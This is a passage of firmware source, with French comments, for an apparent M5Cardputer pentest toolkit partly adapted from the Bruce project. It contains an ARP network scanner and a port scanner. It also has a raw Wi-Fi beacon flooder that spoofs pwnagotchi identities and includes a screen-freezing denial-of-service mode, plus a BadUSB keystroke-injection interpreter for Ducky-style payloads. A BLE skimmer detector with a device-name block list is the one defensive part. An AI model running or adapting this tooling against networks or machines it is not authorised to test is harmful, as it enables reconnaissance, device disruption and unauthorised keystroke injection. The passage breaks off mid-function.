  M5.Display.setCursor(0, M5.Display.height() - 10);
  M5.Display.println("Finished Crawling!");

  while (true) {
    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
      scrollUp();
    } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
      scrollDown();
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      urlBase = "";
      M5.Display.setTextSize(1.5);
      waitAndReturnToMenu("Returning to menu...");
      break;  // Quitter la boucle
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      M5.Display.setTextSize(1.5);
      urlBase = "";
      waitAndReturnToMenu("Returning to menu...");
      return;  // Return to the menu
    }
    delay(100);
  }
  http.end();
  waitAndReturnToMenu("Returning to menu...");
  M5.Display.setTextSize(1.5);
}

















// Scan des hôtes

// Déclarations des fonctions ARP
void read_arp_table(char * from_ip, int read_from, int read_to, std::vector<IPAddress>& hostslist);
void send_arp(char * from_ip, std::vector<IPAddress>& hostslist);

// Fonction pour enregistrer les résultats ARP
void logARPResult(IPAddress host, bool responded) {
  char buffer[64];
  if (responded) {
    sprintf(buffer, "Host %s respond to ARP.", host.toString().c_str());
  } else {
    sprintf(buffer, "Host %s did not respond to ARP.", host.toString().c_str());
  }
  Serial.println(buffer);
}

// Fonction pour effectuer une requête ARP
bool arpRequest(IPAddress host) {
  char ipStr[16];
  sprintf(ipStr, "%s", host.toString().c_str());
  ip4_addr_t test_ip;
  ipaddr_aton(ipStr, (ip_addr_t*)&test_ip);

  struct eth_addr *eth_ret = NULL;
  const ip4_addr_t *ipaddr_ret = NULL;
  bool responded = etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0;
  logARPResult(host, responded);
  return responded;
}


void scanHosts() {
  local_scan_setup();
  waitAndReturnToMenu("Return to menu");
}

void local_scan_setup() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  enterDebounce();
  IPAddress gatewayIP;
  IPAddress subnetMask;
  std::vector<IPAddress> hostslist;
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setTextSize(1.5);

  gatewayIP = WiFi.gatewayIP();
  subnetMask = WiFi.subnetMask();

  IPAddress network = WiFi.localIP();
  network[3] = 0;
  M5.Display.clear();
  int numHosts = 254 - subnetMask[3];
  M5.Display.setCursor(0, M5.Display.height() / 2);
  M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
  M5.Display.println("       please wait...");

  bool foundHosts = false;
  bool stopScan = false; // Variable pour vérifier si ENTER est pressé

  // Préparer l'adresse de base pour les requêtes ARP
  char base_ip[16];
  sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);

  // Envoyer les requêtes ARP à tout le réseau
  send_arp(base_ip, hostslist);

  // Lire la table ARP pour détecter les hôtes actifs
  read_arp_table(base_ip, 1, numHosts, hostslist);

  // Parcourir la table ARP et afficher les résultats
  for (int i = 1; i <= numHosts; i++) {
    if (stopScan) {
      break; // Sortir de la boucle si ENTER est pressé
    }

    IPAddress currentIP = network;
    currentIP[3] = i;

    if (arpRequest(currentIP)) {
      hostslist.push_back(currentIP);
      foundHosts = true;
    }
  }

  if (!foundHosts) {
    M5.Display.println("No hosts found.");
    delay(2000); // Display message for 2 seconds
    return;
  }

  displayHostOptions(hostslist);
}

// Implementation des fonctions ARP
void read_arp_table(char * from_ip, int read_from, int read_to, std::vector<IPAddress>& hostslist) {
  Serial.printf("Reading ARP table from: %d to %d\n", read_from, read_to);
  for (int i = read_from; i <= read_to; i++) {
    char test[32];
    sprintf(test, "%s%d", from_ip, i);
    ip4_addr_t test_ip;
    ipaddr_aton(test, (ip_addr_t*)&test_ip);

    const ip4_addr_t *ipaddr_ret = NULL; // Modification ici
    struct eth_addr *eth_ret = NULL;
    if (etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0) {
      IPAddress foundIP;
      foundIP.fromString(ipaddr_ntoa((ip_addr_t*)&test_ip));
      hostslist.push_back(foundIP);
      Serial.printf("Adding found IP: %s\n", ipaddr_ntoa((ip_addr_t*)&test_ip));
    }
  }
}

void send_arp(char * from_ip, std::vector<IPAddress>& hostslist) {
  Serial.println("Sending ARP requests to the whole network");
  const TickType_t xDelay = (10) / portTICK_PERIOD_MS; // Délai de 0.01 secondes
  void * netif = NULL;
  tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif);
  struct netif *netif_interface = (struct netif *)netif;

  for (char i = 1; i < 254; i++) {
    char test[32];
    sprintf(test, "%s%d", from_ip, i);
    ip4_addr_t test_ip;
    ipaddr_aton(test, (ip_addr_t*)&test_ip);

    // Envoyer la requête ARP
    int8_t arp_request_ret = etharp_request(netif_interface, &test_ip);
    vTaskDelay(xDelay); // Délai
  }
  // Lire toutes les entrées de la table ARP
  read_arp_table(from_ip, 1, 254, hostslist);
}


void displayHostOptions(const std::vector<IPAddress>& hostslist) {
  enterDebounce();
  std::vector<std::pair<std::string, std::function<void()>>> options;
  Serial.println("Hosts that responded to ARP:");
  for (IPAddress ip : hostslist) {
    String txt = ip.toString();
    options.push_back({ txt.c_str(), [ = ]() {
      afterScanOptions(ip, hostslist);
    }
                      });
    Serial.println(txt);
  }

  bool scanninghost = true;
  int index = 0;
  int lineHeight = 12; // Hauteur de ligne pour chaque option 

  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
    M5.update(); // Mise à jour du clavier
    M5Cardputer.update(); // Mise à jour du clavier

    if (scanninghost) {
      // Clear screen
      M5.Display.clear();
      M5.Display.setCursor(0, 0);

      // Display options
      for (int i = 0; i < options.size(); ++i) {
        if (i == index) {
          M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
          M5.Display.setTextColor(TFT_GREEN, TFT_NAVY);
        } else {
          M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        }
        M5.Display.setCursor(0, i * lineHeight);
        M5.Display.println(options[i].first.c_str());
      }

      scanninghost = false;
    }

    // Check for user input
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
      index = (index > 0) ? index - 1 : options.size() - 1;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
      index = (index < options.size() - 1) ? index + 1 : 0;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      Serial.print("Selected option: ");
      Serial.println(options[index].first.c_str());
      options[index].second(); // Execute the function associated with the option
      break; // Exit loop after executing the selected option
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      return; // Exit loop after executing the selected option
    }

    delay(100); // Small delay to avoid CPU overload
  }
}

//from https://github.com/pr3y/bruce and refactored
void afterScanOptions(IPAddress ip, const std::vector<IPAddress>& hostslist) {
  enterDebounce();
  std::vector<std::pair<std::string, std::function<void()>>> option;
  option = {
    { "Scan Ports", [ = ]() {
        scanPorts(ip);
        displayHostOptions(hostslist); // Return to host options after port scan
      }
    },
    { "SSH Connect", [ = ]() {
        sshConnect(ip.toString().c_str());
        displayHostOptions(hostslist); // Return to host options after SSH connect
      }
    },
    { "Web Crawling", [ = ]() {
        webCrawling(ip);
        displayHostOptions(hostslist); // Return to host options after web crawling
      }
    },
  };

  bool scanninghost = true;
  int index = 0;
  int lineHeight = 12; // Hauteur de ligne pour chaque option

  while (1) {
    M5.update(); // Mise à jour du clavier
    M5Cardputer.update(); // Mise à jour du clavier

    if (scanninghost) {
      // Clear screen
      M5.Display.clear();
      M5.Display.setCursor(0, 0);

      // Display options
      for (int i = 0; i < option.size(); ++i) {
        if (i == index) {
          M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
          M5.Display.setTextColor(TFT_GREEN, TFT_NAVY);
        } else {
          M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        }
        M5.Display.setCursor(0, i * lineHeight);
        M5.Display.println(String(i + 1) + ". " + option[i].first.c_str());
      }

      scanninghost = false;
    }

    // Check for user input
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
      index = (index > 0) ? index - 1 : option.size() - 1;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
      index = (index < option.size() - 1) ? index + 1 : 0;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      Serial.print("Selected option: ");
      Serial.println(option[index].first.c_str());
      option[index].second(); // Execute the function associated with the option
      break; // Exit loop after executing the selected option
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      displayHostOptions(hostslist); // Return to host options
      return;
    }

    delay(100);
  }
  delay(200);
}


//from https://github.com/pr3y/bruce and refactored
void scanPorts(IPAddress host) {
  enterDebounce();
  WiFiClient client;
  const int ports[] = {20, 21, 22, 23, 25, 80, 137, 139, 443, 445, 3306, 3389, 8080, 8443, 9090};
  const int numPorts = sizeof(ports) / sizeof(ports[0]);
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(1, 20);
  M5.Display.print("Host: " + host.toString());
  M5.Display.setCursor(1, 34);
  M5.Display.println("Ports Open: ");
  M5.Display.println("");
  for (int i = 0; i < numPorts; i++) {
    int port = ports[i];
    if (client.connect(host, port)) {
      M5.Display.print(port);
      M5.Display.print(", ");
      Serial.println("Port " + String(port) + " Open");
      client.stop();
    } else {
      M5.Display.print("*");
      M5.Display.print(", ");
    }
  }
  M5.Display.setCursor(1, M5.Display.getCursorY() + 16);
  M5.Display.print("Finished!");
  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(10); // Petit délai pour réduire la charge du processeur
  }
  enterDebounce();
}

//Scan hosts




// pwngridspam 



// Global flag to control the spam task
volatile bool spamRunning = false;
volatile bool stop_beacon = false;
volatile bool dos_pwnd = false;
volatile bool change_identity = false;

// Global arrays to hold the faces and names
const char* faces[30];  // Increase size if needed
const char* names[30];  // Increase size if needed
int num_faces = 0;
int num_names = 0;

// Forward declarations
void displaySpamStatus();
void returnToMenu();
void loadFacesAndNames();

// Définir la trame beacon brute
const uint8_t beacon_frame_template[] = {
  0x80, 0x00,                          // Frame Control
  0x00, 0x00,                          // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination Address (Broadcast)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // Source Address (SA)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // BSSID
  0x00, 0x00,                          // Sequence/Fragment number
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
  0x64, 0x00,  // Beacon interval
  0x11, 0x04   // Capability info
};


// Function to generate a random string that resembles a SHA-256 hash
String generate_random_identity() {
  const char hex_chars[] = "0123456789abcdef";
  String random_identity = "";
  for (int i = 0; i < 64; ++i) {
    random_identity += hex_chars[random(0, 16)];
  }
  return random_identity;
}

void send_pwnagotchi_beacon(uint8_t channel, const char* face, const char* name) {
  DynamicJsonDocument json(2048);
  json["pal"] = true;
  json["name"] = name;
  json["face"] = face; // change to {} to freeze the screen
  json["epoch"] = 1;
  json["grid_version"] = "1.10.3";
  if (change_identity) {
    json["identity"] = generate_random_identity();
  } else {
    json["identity"] = "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610";
  }
  json["pwnd_run"] = 0;
  json["pwnd_tot"] = 0;
  json["session_id"] = "a2:00:64:e6:0b:8b";
  json["timestamp"] = 0;
  json["uptime"] = 0;
  json["version"] = "1.8.4";
  json["policy"]["advertise"] = true;
  json["policy"]["bond_encounters_factor"] = 20000;
  json["policy"]["bored_num_epochs"] = 0;
  json["policy"]["sad_num_epochs"] = 0;
  json["policy"]["excited_num_epochs"] = 9999;

  String json_str;
  serializeJson(json, json_str);

  uint16_t json_len = json_str.length();
  uint8_t header_len = 2 + ((json_len / 255) * 2);
  uint8_t beacon_frame[sizeof(beacon_frame_template) + json_len + header_len];
  memcpy(beacon_frame, beacon_frame_template, sizeof(beacon_frame_template));

  // Ajout des données JSON à la trame beacon
  int frame_byte = sizeof(beacon_frame_template);
  for (int i = 0; i < json_len; i++) {
    if (i == 0 || i % 255 == 0) {
      beacon_frame[frame_byte++] = 0xde;  // AC = 222
      uint8_t payload_len = 255;
      if (json_len - i < 255) {
        payload_len = json_len - i;
      }
      beacon_frame[frame_byte++] = payload_len;
    }
    beacon_frame[frame_byte++] = (uint8_t)json_str[i];
  }

  // Définir le canal et envoyer la trame
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
}

const char* pwnd_faces[] = {
  "NOPWND!■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■\n■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
};
const char* pwnd_names[] = {
  "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
};

// Tâche pour envoyer des trames beacon avec changement de face, de nom et de canal
void beacon_task(void* pvParameters) {
  const uint8_t channels[] = {1, 6, 11};  // Liste des canaux Wi-Fi à utiliser
  const int num_channels = sizeof(channels) / sizeof(channels[0]);
  const int num_pwnd_faces = sizeof(pwnd_faces) / sizeof(pwnd_faces[0]);

  while (spamRunning) {
    if (dos_pwnd) {
      // Send PWND beacons
      for (int ch = 0; ch < num_channels; ++ch) {
        if (stop_beacon) {
          break;
        }
        send_pwnagotchi_beacon(channels[ch], pwnd_faces[0], pwnd_names[0]);
        vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
      }
    } else {
      // Send regular beacons
      for (int i = 0; i < num_faces; ++i) {
        for (int ch = 0; ch < num_channels; ++ch) {
          if (stop_beacon) {
            break;
          }
          send_pwnagotchi_beacon(channels[ch], faces[i], names[i % num_names]);
          vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
        }
      }
    }
  }

  vTaskDelete(NULL);
}

void displaySpamStatus() {
  enterDebounce();
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(TFT_WHITE , TFT_BLACK);
  M5.Display.setCursor(0, 10);
  M5.Display.println("PwnGrid Spam Running...");

  int current_face_index = 0;
  int current_name_index = 0;
  int current_channel_index = 0;
  const uint8_t channels[] = {1, 6, 11};
  const int num_channels = sizeof(channels) / sizeof(channels[0]);

  while (spamRunning) {
    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      spamRunning = false;
      waitAndReturnToMenu("Back to menu");
      break;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('d')) {
      dos_pwnd = !dos_pwnd;
      Serial.printf("DoScreen %s.\n", dos_pwnd ? "enabled" : "disabled");
    }
    if (M5Cardputer.Keyboard.isKeyPressed('f')) {
      change_identity = !change_identity;
      Serial.printf("Change Identity %s.\n", change_identity ? "enabled" : "disabled");
    }

    // Update and display current face, name, and channel
    M5.Display.setCursor(20, 30);
    M5.Display.printf("Flood:%s", change_identity ? "1" : "0");
    M5.Display.setCursor(100, 30);
    M5.Display.printf("DoScreen:%s", dos_pwnd ? "1" : "0");
    if (!dos_pwnd) {
      M5.Display.setCursor(0, 50);
      M5.Display.printf("Face: \n%s                                              ", faces[current_face_index]);
      M5.Display.setCursor(0, 80);
      M5.Display.printf("Name:                  \n%s                                              ", names[current_name_index]);
    } else {
      M5.Display.setCursor(0, 50);
      M5.Display.printf("Face:\nNOPWND!■■■■■■■■■■■■■■■■■");
      M5.Display.setCursor(0, 80);
      M5.Display.printf("Name:\n■■■■■■■■■■■■■■■■■■■■■■");
    }
    M5.Display.setCursor(0, 110);
    M5.Display.printf("Channel: %d  ", channels[current_channel_index]);

    // Update indices for next display
    current_face_index = (current_face_index + 1) % num_faces;
    current_name_index = (current_name_index + 1) % num_names;
    current_channel_index = (current_channel_index + 1) % num_channels;

    delay(200); // Update the display every 200 ms
  }
}


void loadFacesAndNames() {
  File file = SD.open("/config/pwngridspam.txt");
  if (!file) {
    Serial.println("Failed to open file for reading");
    return;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("faces=")) {
      String faces_line = line.substring(6);
      faces_line.replace("\"", "");  // Remove quotes
      faces_line.trim();  // Remove leading/trailing whitespace
      faces_line.replace("\\n", "\n");  // Handle newline characters
      int start = 0;
      int end = faces_line.indexOf(',', start);
      num_faces = 0;
      while (end != -1) {
        faces[num_faces++] = strdup(faces_line.substring(start, end).c_str());
        start = end + 1;
        end = faces_line.indexOf(',', start);
      }
      faces[num_faces++] = strdup(faces_line.substring(start).c_str());
    } else if (line.startsWith("names=")) {
      String names_line = line.substring(6);
      names_line.replace("\"", "");  // Remove quotes
      names_line.trim();  // Remove leading/trailing whitespace
      int start = 0;
      int end = names_line.indexOf(',', start);
      num_names = 0;
      while (end != -1) {
        names[num_names++] = strdup(names_line.substring(start, end).c_str());
        start = end + 1;
        end = names_line.indexOf(',', start);
      }
      names[num_names++] = strdup(names_line.substring(start).c_str());
    }
  }
  file.close();
}

extern "C" void send_pwnagotchi_beacon_main() {
  // Initialiser NVS
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  // Initialiser la configuration Wi-Fi
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_start());

  // Load faces and names from the file
  loadFacesAndNames();

  // Set the spamRunning flag to true
  spamRunning = true;

  // Créer la tâche beacon
  xTaskCreate(&beacon_task, "beacon_task", 4096, NULL, 5, NULL);

  // Display the spam status and wait for user input
  displaySpamStatus();
}

// pwngridspam end




// detectskimmer 
class SkimmerAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
public:
  void onResult(BLEAdvertisedDevice advertisedDevice) override {
    String bad_list[] = {"HC-03", "HC-05", "HC-06"};
    int bad_list_length = sizeof(bad_list) / sizeof(bad_list[0]);
    bool isSkimmerDetected = false;
    String displayMessage = "Device: ";

    if (advertisedDevice.getName().length() != 0) {
      String deviceName = advertisedDevice.getName().c_str();
      displayMessage += deviceName;

      for (uint8_t i = 0; i < bad_list_length; i++) {
        if (deviceName.equals(bad_list[i])) {
          isSkimmerDetected = true;
          Serial.println(" - Skimmer Detected!");
          displayMessage += " - Skimmer Detected!";
          break;
        }
      }
    } else {
      String deviceAddress = advertisedDevice.getAddress().toString().c_str();
      displayMessage += deviceAddress;
    }

    displayMessage += " RSSI: " + String(advertisedDevice.getRSSI());
    Serial.println(displayMessage);


    M5.Display.clear(TFT_BLACK);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(isSkimmerDetected ? TFT_RED : TFT_WHITE);
    M5.Display.setCursor(0, 20);
    M5.Display.println(displayMessage);
  }
};

void skimmerDetection() {
  BLEDevice::init("");
  BLEScan* scan = BLEDevice::getScan();
  scan->setAdvertisedDeviceCallbacks(new SkimmerAdvertisedDeviceCallbacks());
  scan->setInterval(1349);
  scan->setWindow(449);
  
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(0, 0);
  M5.Display.println("Scanning for Skimmers...");

  // Boucle pour gérer l'entrée de l'utilisateur
  while (true) {
    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      waitAndReturnToMenu("Scan Stopped");
      return;
    }
    scan->start(5, false); // Scan pendant 5 secondes
  }
}

// detectskimmer end 




// badusb 
//from https://github.com/pr3y/bruce and refactored

void key_input(FS &fs, const String &bad_script) {
  if (fs.exists(bad_script) && !bad_script.isEmpty()) {
    File payloadFile = fs.open(bad_script, "r");
    if (payloadFile) {
      M5.Display.setCursor(0, 40);
      M5.Display.println("from file!");
      String lineContent = "";
      String Command = "";
      char Cmd[15];
      String Argument = "";
      String RepeatTmp = "";
      char ArgChar;
      bool ArgIsCmd;  // Vérifie si l'argument est DELETE, TAB ou F1-F12
      int cmdFail;    // Vérifie si la commande est supportée
      int line;       // Montre 3 commandes du payload sur l'écran

      Kb.releaseAll();
      M5.Display.setTextSize(1);
      M5.Display.setCursor(0, 0);
      M5.Display.fillScreen(TFT_BLACK);
      line = 0;

      while (payloadFile.available()) {
        lineContent = payloadFile.readStringUntil('\n');
        if (lineContent.endsWith("\r")) lineContent.remove(lineContent.length() - 1);

        ArgIsCmd = false;
        cmdFail = 0;
        RepeatTmp = lineContent.substring(0, lineContent.indexOf(' '));
        RepeatTmp = RepeatTmp.c_str();
        if (RepeatTmp == "REPEAT") {
          if (lineContent.indexOf(' ') > 0) {
            RepeatTmp = lineContent.substring(lineContent.indexOf(' ') + 1);
            if (RepeatTmp.toInt() == 0) {
              RepeatTmp = "1";
              M5.Display.setTextColor(TFT_RED);
              M5.Display.println("REPEAT argument NaN, repeating once");
            }
          } else {
            RepeatTmp = "1";
            M5.Display.setTextColor(TFT_RED);
            M5.Display.println("REPEAT without argument, repeating once");
          }
        } else {
          Command = lineContent.substring(0, lineContent.indexOf(' '));
          strcpy(Cmd, Command.c_str());
          Argument = lineContent.substring(lineContent.indexOf(' ') + 1);
          RepeatTmp = "1";
        }
        uint16_t i;
        for (i = 0; i < RepeatTmp.toInt(); i++) {
          char OldCmd[15];
          Argument = Argument.c_str();
          ArgChar = Argument.charAt(0);

          if (Argument == "F1" || Argument == "F2" || Argument == "F3" || Argument == "F4" || 
              Argument == "F5" || Argument == "F6" || Argument == "F7" || Argument == "F8" || 
              Argument == "F9" || Argument == "F10" || Argument == "F11" || Argument == "F12" || 
              Argument == "DELETE" || Argument == "TAB" || Argument == "ENTER") { 
            ArgIsCmd = true; 
          }

          restart: // restart checks

          if (strcmp(Cmd, "REM") == 0)          { Serial.println(" // " + Argument); }                  else { cmdFail++; }
          if (strcmp(Cmd, "DELAY") == 0)        { delay(Argument.toInt()); }                            else { cmdFail++; }
          if (strcmp(Cmd, "DEFAULTDELAY") == 0 || strcmp(Cmd, "DEFAULT_DELAY") == 0) delay(DEF_DELAY);  else { cmdFail++; }  //100ms
          if (strcmp(Cmd, "STRING") == 0)       { Kb.print(Argument);}                                  else { cmdFail++; }
          if (strcmp(Cmd, "STRINGLN") == 0)     { Kb.println(Argument); }                               else { cmdFail++; }
          if (strcmp(Cmd, "SHIFT") == 0)        { Kb.press(KEY_LEFT_SHIFT);                                                         if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // Save Cmd into OldCmd and then set Cmd = Argument
          if (strcmp(Cmd, "ALT") == 0)          { Kb.press(KEY_LEFT_ALT);                                                           if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // This is made to turn the code faster and to recover
          if (strcmp(Cmd, "CTRL-ALT") == 0)     { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // the Cmd after the if else statements, in order to
          if (strcmp(Cmd, "CTRL-SHIFT") == 0)   { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);                                if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}// the Cmd REPEAT work as intended.
          if (strcmp(Cmd, "CTRL-GUI") == 0)     { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ALT-SHIFT") == 0)    { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ALT-GUI") == 0)      { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_GUI);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "GUI-SHIFT") == 0)    { Kb.press(KEY_LEFT_GUI); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL-ALT-SHIFT") == 0) { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL-ALT-GUI") == 0)   { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);        if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ALT-SHIFT-GUI") == 0)  { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);       if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL-SHIFT-GUI") == 0) { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "GUI") == 0 || strcmp(Cmd, "WINDOWS") == 0) { Kb.press(KEY_LEFT_GUI);                                     if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL") == 0 || strcmp(Cmd, "CONTROL") == 0) { Kb.press(KEY_LEFT_CTRL);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ESC") == 0 || strcmp(Cmd, "ESCAPE") == 0) {Kb.press(KEY_ESC);Kb.releaseAll(); } else { cmdFail++;}
          if (strcmp(Cmd, "ENTER") == 0)        { Kb.press(KEY_RETURN); Kb.releaseAll(); }    else { cmdFail++; }
          if (strcmp(Cmd, "DOWNARROW") == 0)    { Kb.press(KEY_DOWN_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "DOWN") == 0)         { Kb.press(KEY_DOWN_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "LEFTARROW") == 0)    { Kb.press(KEY_LEFT_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "LEFT") == 0)         { Kb.press(KEY_LEFT_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "RIGHTARROW") == 0)   { Kb.press(KEY_RIGHT_ARROW);Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "RIGHT") == 0)        { Kb.press(KEY_RIGHT_ARROW);Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "UPARROW") == 0)      { Kb.press(KEY_UP_ARROW);   Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "UP") == 0)           { Kb.press(KEY_UP_ARROW);   Kb.releaseAll();} else { cmdFail++;}
